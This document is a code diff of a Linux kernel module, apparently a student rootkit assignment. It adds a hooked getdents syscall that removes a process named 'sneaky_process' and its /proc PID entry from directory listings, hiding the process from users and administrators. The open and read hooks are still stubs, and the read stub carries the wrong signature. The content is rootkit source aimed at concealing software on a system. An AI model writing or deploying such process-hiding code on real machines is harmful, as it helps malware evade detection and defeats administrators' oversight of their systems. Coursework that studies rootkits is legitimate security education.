@@ -9,14 +9,16 @@
 #include <asm/page.h>
 #include <asm/cacheflush.h>
 
-
+static char *pid = "";
+module_param(pid, charp, 0);
+MODULE_PARM_DESC(pid, "Process id of the sneaky program");
 
 //make sure that the “struct linux_dirent” is interpreted correctly
 struct linux_dirent {
-  u64 d_ino;
-  s64 d_off;
+  long           d_ino;
+  off_t          d_off;
   unsigned short d_reclen;
-  char d_name[];
+  char           d_name[];
 };
 
 
@@ -50,10 +52,27 @@ asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);//For read(
 
 ////////////////////////////////////////////////////////////////////////////////
 //Define our new sneaky version of the 'getdents' syscall (step#1 and #2)
-asmlinkage int sneaky_sys_open(const char *pathname, int flags)
+asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,unsigned int count)
 {
-  printk(KERN_INFO "Very, very Sneaky!\n");
-  return original_call(pathname, flags);
+  int nread;
+  int bpos;
+  struct linux_dirent *d;
+  nread = original_getdents(fd, dirp, count);
+  for (bpos = 0; bpos < nread;) {
+    d = (struct linux_dirent *)(dirp + bpos);
+    
+    //In order to hide the “sneaky_process”, need to skip sneaky_process in step #1 and the pid named file in step #2
+    if (strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, pid) == 0) {
+      int direntLength = d->d_reclen;
+      int nrest = ((void *)dirp + nread) - ((void *)d + direntLength);
+      void *next = (void *)d + direntLength;
+      memmove(d, next, nrest);//Same as memcpy but will be safer if there is overlapping between destination and source
+      nread -= direntLength;
+      continue;
+    }
+    bpos += d->d_reclen;
+  }
+  return nread;
 }
 
 //Define our new sneaky version of the 'open' syscall(step #3)
@@ -64,7 +83,7 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 }
 
 // Define our new sneaky version of the 'read' syscall(step #4) 
-asmlinkage int sneaky_sys_open(const char *pathname, int flags)
+asmlinkage int sneaky_sys_read(const char *pathname, int flags)
 {
   printk(KERN_INFO "Very, very Sneaky!\n");
   return original_call(pathname, flags);
@@ -142,3 +161,5 @@ static void exit_sneaky_module(void)
 module_init(initialize_sneaky_module);  // what's called upon loading 
 module_exit(exit_sneaky_module);        // what's called upon unloading  
 
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Yisong Zou");
